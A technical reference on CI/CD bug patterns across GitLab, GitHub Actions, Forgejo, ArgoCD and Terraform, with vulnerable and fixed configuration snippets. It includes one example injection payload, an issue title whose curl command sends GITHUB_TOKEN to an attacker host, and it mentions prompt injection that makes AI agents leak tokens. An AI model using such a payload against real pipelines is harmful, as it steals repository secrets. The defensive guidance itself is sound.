# CI/CD Pipeline Bug Patterns

Bug patterns specific to CI/CD pipeline configurations. Focused on correctness bugs that cause failed deployments, data loss, or security incidents -- not style or formatting.

---

## GitLab CI/CD

### rules vs only/except Migration Traps

**Detect:**
- Mixing `rules:` and `only:/except:` in the same job -- GitLab silently rejects this; one or the other per job
- Default behavior mismatch: `only/except` defaults to `except: merge_requests`; `rules:` defaults to `when: on_success` -- migrating 1:1 causes jobs to run on MR pipelines they didn't before
- Missing `when: never` as final rule -- without it, unmatched conditions fall through and the job runs anyway (opposite of `only/except` behavior where unmatched means skip)
- `workflow:rules` absent while jobs use `rules:` -- single events like pushing to an open MR branch trigger both push AND merge request pipelines simultaneously, running every job twice
- Final `when: always` without `workflow: rules` creates duplicate pipelines across push and MR events
- Rule order matters: first matching rule wins -- put specific rules before general catch-alls

**Example:**
```yaml
# bug: duplicate pipelines -- push to MR branch triggers both push and MR pipelines
build:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH

# fix: add workflow:rules to prevent duplicate pipeline types
workflow:
  rules:
    - if: $CI_PIPELINE_SOURCE == "merge_request_event"
    - if: $CI_COMMIT_BRANCH && $CI_OPEN_MERGE_REQUESTS
      when: never  # suppress push pipeline when MR is open
    - if: $CI_COMMIT_BRANCH
```

### Variable Scoping Bugs

**Detect:**
- Using `dotenv` variables (created in job scripts) in `rules:` conditions -- rules are evaluated before any jobs run, so these variables don't exist yet
- Variables in `include:rules` -- only pre-pipeline variables work here, not pipeline variables
- Protected variables on non-protected branches -- the job runs but the variable is silently empty, causing partial/broken deployments with no error
- `after_script` accessing variables from `before_script`/`script` -- `after_script` runs in an isolated shell context, only variables defined within it are available
- Variable precedence chain: extra-vars > trigger variables > project variables > group variables > instance variables -- a group variable silently overridden by a project variable with the same name
- Regex patterns in variable comparisons not expanded -- wrap in forward slashes: `=~ /pattern/`, not `=~ "pattern"` (the latter does substring matching instead)

### Cache and Artifact Gotchas

**Detect:**
- Cache and artifacts storing the same path -- cache is restored before artifacts, so the cache overwrites the artifact content
- Missing cache key prefix in shared runners -- `$CI_PROJECT_NAME` prefix prevents collisions when multiple projects use the same runner/storage
- Cache treated as guaranteed (it's not) -- use artifacts for inter-job data, cache only for speed optimization
- Default artifact expiry is 30 days -- artifacts from old pipelines silently disappear if `expire_in` isn't set
- `keep latest artifacts` enabled but developers expect intermediate pipeline artifacts (only the latest pipeline's artifacts survive)
- Using cache for build outputs between stages instead of artifacts -- cache may not be available on different runners

### needs vs dependencies (DAG)

**Detect:**
- `needs:` chains running all the way through deployment -- modules deploy at different versions when one chain completes before another. Stop `needs` chains before critical steps like image builds and deploys
- `needs: []` (empty array) means "run immediately, no dependencies" -- not "don't run." Easy to confuse with omitting `needs` entirely
- `dependencies: []` means "download no artifacts" but the job still waits for its stage. `needs: []` means "skip stage ordering entirely." Different keywords, very different behavior
- DAG with `needs` across stages -- jobs can start before their stage begins, which breaks assumptions about sequential stage execution
- Jobs with `needs` referencing a job that was excluded by `rules` -- the dependent job fails with "job not found"

### Runner Tag Mismatches

**Detect:**
- Job with `tags: [specific-runner]` where the runner is offline or doesn't exist -- job sits in "pending" state forever with no error message and no timeout
- Protected runners assigned to non-protected jobs (or vice versa) -- job pending indefinitely
- Missing `tags` on jobs that need specific capabilities (Docker, GPU) -- job runs on a generic runner and fails during execution, not at scheduling time

### Protected Variable Leaks

**Detect:**
- Protected variables exposed in multi-project pipeline triggers -- child pipeline may run on unprotected branches while receiving the parent's protected variables (GitLab issue #290754)
- Tags with the same name as protected branches -- creating a tag named `main` can access variables protected for the `main` branch (GitLab FOSS issue #53477)
- `CI_COMMIT_REF_PROTECTED` behavior incorrect for merge request pipelines from protected branches (GitLab issue #121609)

---

### Supply Chain: Image Integrity

**Detect:**
- `image: name:` with bare tags (`:latest`, `:v1.2.3`) and no `@sha256:` digest -- tags are mutable and can be force-pushed to point at malicious images
- `pull_policy: always` combined with unpinned tags -- every pipeline run pulls whatever the tag currently points to, with no verification
- `$DOCKER_AUTH_CONFIG` available to all jobs via global variables -- a compromised CI image gets free registry credentials
- Deprecated tool images still in use (`aquasec/tfsec`, etc.) -- abandoned repos with Docker Hub push access are prime supply chain targets

**Example:**
```yaml
# vulnerable: tag can be force-pushed, pull_policy ensures fresh pull every time
image:
  name: aquasec/tfsec:latest
  pull_policy: always

# fixed: digest-pinned, tag retained for renovate version tracking
image:
  name: aquasec/tfsec:1.28.11@sha256:ac46d48a384ae...
  pull_policy: always
```

**Real incident:** Trivy supply chain attack (March 2026) -- attackers compromised Aqua Security's aqua-bot account, force-pushed 75/76 trivy-action tags to credential-stealing code, published backdoored binaries to Docker Hub/GHCR/ECR, pushed malicious workflows to tfsec/traceeshark repos.

---

## GitHub Actions

### Expression Injection (${{ }})

The single most dangerous pattern in GitHub Actions. `${{ }}` expressions in `run:` blocks undergo macro-expansion before shell execution, turning untrusted input into arbitrary code execution.

**Detect:**
- `${{ github.event.issue.title }}` or `${{ github.event.pull_request.title }}` used directly in `run:` -- attacker creates issue titled `$(curl attacker.com/steal?token=$GITHUB_TOKEN)`
- Any `${{ github.event.* }}` in `run:` blocks -- issue bodies, PR descriptions, branch names, commit messages, review comments are all attacker-controlled
- `${{ github.head_ref }}` in `run:` -- branch names are attacker-controlled input

**Fix:** Always assign to an environment variable first:
```yaml
# vulnerable
- run: echo "Processing ${{ github.event.issue.title }}"

# safe
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Processing $TITLE"
```

### GITHUB_TOKEN Permission Scope

**Detect:**
- Repositories created before February 2023 still running with default `read-write` token permissions -- newer repos default to read-only, but legacy repos don't auto-migrate
- Workflows without explicit `permissions:` block -- inherits the repository's default (which may be overprivileged)
- `permissions: write-all` for convenience instead of scoping to specific permissions
- `contents: write` on workflows triggered by external PRs -- allows pushing malicious code to the repo
- `packages: write` combined with untrusted workflow triggers -- allows publishing compromised packages

**Fix:** Always declare minimum permissions explicitly:
```yaml
permissions:
  contents: read
  pull-requests: write  # only if needed
```

### pull_request_target Exploits

**Detect:**
- `pull_request_target` trigger with `actions/checkout` checking out the PR's head ref -- runs attacker's code with base repo permissions and secrets
- `pull_request_target` without `if: github.event.pull_request.head.repo.full_name == github.repository` -- external fork PRs run with full write permissions
- Self-hosted runners with `pull_request_target` -- attacker code persists on the runner between workflow runs, accessing IMDS tokens and credentials
- Modified build/deployment scripts in PRs that execute during `pull_request_target` workflows (reverse shells, secret exfiltration)

**Real incidents (2025-2026):**
- Microsoft/symphony: attacker modified `setup-azcli.sh` via PR, exfiltrated Azure service principal
- Google/ai-ml-recipes: modified `generate_docs.py`, leaked GEMINI_API_KEY
- Nvidia/nvrc: modified `install_rust.sh` on self-hosted runner, exfiltrated EC2 IMDS token
- HackerBot-Claw (Feb 2026): automated campaign scanning public repos for vulnerable `pull_request_target` workflows

### Concurrency Group Bugs

**Detect:**
- Same concurrency group defined at both workflow level and job level -- creates a deadlock, job is skipped with "Canceling since a deadlock for concurrency group was detected"
- Concurrency groups using `${{ inputs.* }}` from reusable workflow inputs -- the variable is empty at the workflow level, creating a single shared group that cancels unrelated runs
- `cancel-in-progress: true` on deployment workflows -- a new push cancels an in-progress deployment, leaving resources in an inconsistent state
- Reusable workflow concurrency defined at caller's job level instead of the called workflow's workflow level -- the called workflow ignores the caller's concurrency settings

### Artifact v4 Breaking Changes

**Detect:**
- Workflows still using `actions/upload-artifact@v3` or `actions/download-artifact@v3` -- v3 was deprecated April 2024 and stopped working January 30, 2025
- Hidden files (`.env`, `.config`, credentials) were included by default in v3 but excluded in v4 -- workflows relying on hidden file upload break silently
- v4 on GitHub Enterprise Server (GHES) -- not supported on older GHES versions; must use v3
- Artifact names with special characters that worked in v3 but fail in v4

### Composite Action and Reusable Workflow Limitations

**Detect:**
- `./path` references in reusable workflows resolve to the caller's workspace, not the reusable workflow's repo -- composite actions from a different repo need full `owner/repo/path@ref` references
- Hardcoded refs like `my-org/repo/setup@v1` can't be tested before tagging and defeat SHA pinning
- Reusable workflow input defaults accessed via `on.workflow_call.inputs.<id>.default` -- works in GitHub, always empty in Forgejo
- Post-reusable-workflow steps can't use `GITHUB_ENV` to pass values back to the caller workflow
- Composite actions from `.github/` directory unavailable in subsequent jobs unless the repo is checked out again

### Path Filter Edge Cases

**Detect:**
- `paths:` filter on `push` events doesn't fire for the initial commit (no diff base)
- Path filters combined with `required` status checks -- if the path filter skips the workflow, the required check never reports, blocking merges. Use `paths-ignore` or a separate always-running workflow for the status check
- Path filters don't work with `workflow_dispatch` or `schedule` triggers
- Glob patterns in `paths:` -- `**` matches any number of directories but `*` doesn't match `/`, so `src/*` only matches one level deep

### Supply Chain Attacks

**Detect:**
- Actions referenced by mutable tag (`@v1`) instead of full SHA -- tags can be force-pushed by compromised action repos (tj-actions CVE-2025-30066; upstream: reviewdog CVE-2025-30154)
- Actions from unverified publishers without pinned commits
- Prompt injection through issue/PR content when AI tools are connected to workflows -- malicious instructions in issue titles cause AI agents to leak GITHUB_TOKEN and API keys

---

## Forgejo Actions

### Compatibility Gaps with GitHub Actions

Forgejo Actions is designed for familiarity, not compatibility. It makes no compatibility guarantees.

**Detect:**
- `permissions:` block in workflow/job -- **silently ignored** in Forgejo; all workflows run with the same default permissions
- `continue-on-error:` on jobs -- **silently ignored**
- `GITHUB_TOKEN` used for GitHub API calls -- Forgejo provides a compatibility token, but it's not a real GitHub token. Requests to GitHub API will fail
- Runner environment assumes Ubuntu tooling -- Forgejo Runners typically use Debian bookworm with just Node.js, missing most tools from GitHub's ubuntu-latest image
- `on.workflow_call.inputs.<id>.default` -- always empty in Forgejo, even though GitHub populates it
- OIDC token generation uses `enable-openid-connect` key instead of `permissions: id-token: write`
- Some keys in the `github` context are missing or have different values
- `secrets` map is empty for `pull_request` events from forked repos (same as GitHub, but worth noting)
- LXC container execution is supported (Forgejo-specific feature not in GitHub)
- Third-party actions that rely on GitHub-specific API calls or contexts will silently fail

---

## ArgoCD Advanced Patterns

### ApplicationSet Generator Bugs

**Detect:**
- Merge generator with overlapping keys across generators -- if both generators produce a `branch` parameter, merge fails with duplicate key error (ArgoCD issue #14556)
- Matrix generator limited to exactly 2 data sources -- need 3+ dimensions requires nested generators, which are complex and error-prone
- Matrix generator with SCM and Git -- one repository with invalid YAML causes all applications to fail with hard-to-debug errors (ArgoCD issue #19982)
- Merge generator key mismatch -- if the merge key doesn't exist in all generators, applications are silently dropped
- Generators producing overlapping Application names -- last one wins, silently overwriting the others
- Missing `goTemplate: true` when using complex template expressions -- default Helm-like templating has different escaping rules

### Sync Window Violations

**Detect:**
- Sync windows that block automated syncs but don't block manual syncs (or vice versa) -- verify which `kind` is set: `allow` vs `deny`
- Sync window schedules in UTC but operators expecting local time -- cron expressions don't support timezones natively
- Multiple overlapping sync windows with conflicting policies -- the most restrictive window wins, which can block deployments during expected deploy times
- Sync windows on Application level vs AppProject level -- different scopes, easy to configure the wrong one

### Resource Hook Ordering

**Detect:**
- `argocd.argoproj.io/hook: PreSync` on jobs that depend on resources in the same sync wave -- PreSync runs before any sync, so dependencies don't exist yet
- Sync waves without understanding phases: PreSync hooks all run first (by wave), then Sync resources (by wave), then PostSync hooks (by wave) -- you can't interleave hooks and resources across phases
- `hook-delete-policy: HookSucceeded` on debugging jobs -- successful hooks are deleted immediately, can't inspect logs
- `hook-delete-policy: BeforeHookCreation` is the default -- old hook resources linger until the next sync, consuming cluster resources
- Negative sync waves on hooks -- hooks execute by phase first, then by wave within that phase. A PreSync hook at wave -10 doesn't run before a PreSync hook at wave -20

### Progressive Delivery with Argo Rollouts

**Detect:**
- `automated.prune: true` with Rollouts -- can delete the Rollout resource itself if removed from git during a canary deployment
- Missing `ignoreDifferences` for fields managed by the Rollouts controller (e.g., `.spec.replicas` when using autoscaling)
- Argo Rollouts' `analysis` templates referencing metrics endpoints that don't exist yet (created in the same deployment)
- Progressive syncs require explicit opt-in: `--enable-progressive-syncs` flag or `applicationsetcontroller.enable.progressive.syncs: "true"` in ConfigMap -- without it, all applications sync simultaneously

### Multi-Source Application Gotchas

**Detect:**
- Source ordering causes resource overwrites -- ArgoCD renders sources separately then combines; duplicate resources across sources silently conflict
- Partial sync failures -- one source fails during rendering while another succeeds; the Application shows a generic error without identifying which source failed
- `$ref` mechanism for cross-source value files -- ref name typos are case-sensitive, file paths must not include the repository name, and the referenced file must exist at the exact specified revision
- Multi-source applications have longer render times -- each source adds overhead. Repo server timeouts may need increasing
- Stale manifest caches across sources -- use `--hard-refresh` to clear, or restart the repo server pod
- `argocd app manifests` doesn't clearly distinguish which source produced which resource

### Annotation-Based Sync Options

**Detect:**
- `argocd.argoproj.io/sync-options: Prune=false` on a resource annotation -- silently prevents that specific resource from being pruned, even when the Application has `prune: true`. Easy to set and forget
- Multiple sync options concatenated with commas in annotation value -- typo in one option silently disables the intended behavior
- `argocd.argoproj.io/managed-by: external` -- removes the resource from ArgoCD tracking entirely. If set accidentally, ArgoCD ignores drift on that resource
- `argocd.argoproj.io/compare-options: IgnoreExtraneous` -- resource won't show as OutOfSync even when it differs from Git. Dangerous if applied broadly
- Resource tracking method changes (`annotation+label` vs `label` vs `annotation`) -- switching methods requires force-refreshing all applications; stale tracking metadata causes ghost resources or tracking conflicts
- `FailOnSharedResource=true` not enabled -- multiple Applications can claim the same resource without warning, causing sync flip-flopping

---

## Terraform Advanced

### State Locking Race Conditions

**Detect:**
- Multiple CI/CD pipelines running `terraform apply` concurrently on the same state -- even with locking, the second pipeline blocks until the first finishes, causing timeouts and pipeline failures
- `force-unlock` used in CI scripts -- if the original operation is still running, this corrupts state
- Conditional check failures during lock acquisition (DynamoDB) -- stale lock metadata causes phantom locks
- Backend configuration changes (e.g., switching from local to S3) without migrating state -- terraform creates a new empty state, plans to create all existing resources
- Multiple state files managing the same resource -- no lock coordination between different state files, leading to resource conflicts

### Workspace Isolation Failures

**Detect:**
- Shared backend with workspace isolation but resources have hardcoded names -- resources in different workspaces collide (e.g., both `dev` and `staging` workspaces creating an S3 bucket named `my-app-data`)
- `terraform.workspace` not used in resource naming/tagging -- resources from different workspaces are indistinguishable
- `default` workspace used in production -- can't be deleted, easy to accidentally deploy to
- Workspace-specific variables not set -- `terraform.tfvars` applies to all workspaces; need per-workspace `.tfvars` files or workspace-conditional locals

### Provider Alias Confusion

**Detect:**
- `configuration_aliases` in child modules cause `terraform validate` to fail with "Provider configuration not present" -- adding an empty provider block fixes validation but triggers a warning that it's unnecessary (catch-22, see terraform issues #28567, #28490, #28565)
- Aliased providers in modules not passed explicitly from the caller -- the module silently uses the default provider configuration instead of the intended alias
- Provider version constraints differing between root module and child modules -- child module's provider constraint can conflict with root, causing plan failures
- `required_providers` in child module not matching root module's provider source -- terraform resolves to different providers

### moved Blocks Breaking Plans

**Detect:**
- `moved` block combined with `import` block on the same resource -- moved block sees existing objects at intended addresses and fails with "unresolved resource instance address changes" (terraform issue #32758)
- `moved` blocks are static -- no conditional logic, no dynamic references. Can't handle scenarios where movement depends on runtime conditions
- `moved` block only applies during `plan` and `apply` -- manual state file edits aren't reconciled by moved blocks
- Removing a `moved` block too early -- if any environment/workspace hasn't applied the plan with the moved block yet, removing it causes Terraform to plan deletion of the old resource and creation of a new one
- Dynamic moved blocks not supported (terraform issue #33236) -- can't use `for_each` or `count` with moved blocks

### import Block Limitations

**Detect:**
- `import` block requires the resource already be defined in HCL -- unlike `terraform import` CLI, the config-driven import doesn't generate configuration
- `import` with resources that have `create_before_destroy` lifecycle -- import doesn't set lifecycle attributes, subsequent plan may try to recreate
- `import` block for resources in modules with `for_each` -- must match the exact module instance key
- Imported resource has computed attributes that differ from the config -- first plan after import shows changes that look like drift but are just configuration alignment

### check Blocks vs validation Blocks

**Detect:**
- Using `check` blocks for mandatory compliance rules -- check blocks produce **warnings**, not errors. They don't block the deployment. Use preconditions/postconditions for mandatory checks
- Using `preconditions` for post-apply verification -- preconditions run before resource creation, so post-creation attributes aren't available. Use postconditions instead
- `variable` validation referencing other variables or resources -- variable validation can only reference the variable being validated. Use preconditions for cross-variable checks
- `postcondition` failure doesn't undo the resource that was just created -- it halts processing and prevents downstream resources, but the failed resource persists in state
- Check blocks run as the final step of plan/apply, after postconditions -- ordering: variable validation -> preconditions -> resource creation -> postconditions -> check blocks

**Decision framework:**
- Parameter validation -> `variable` validation blocks
- Assumptions about inputs -> `precondition`
- Guarantees about outputs -> `postcondition`
- Non-blocking infrastructure health monitoring -> `check` blocks
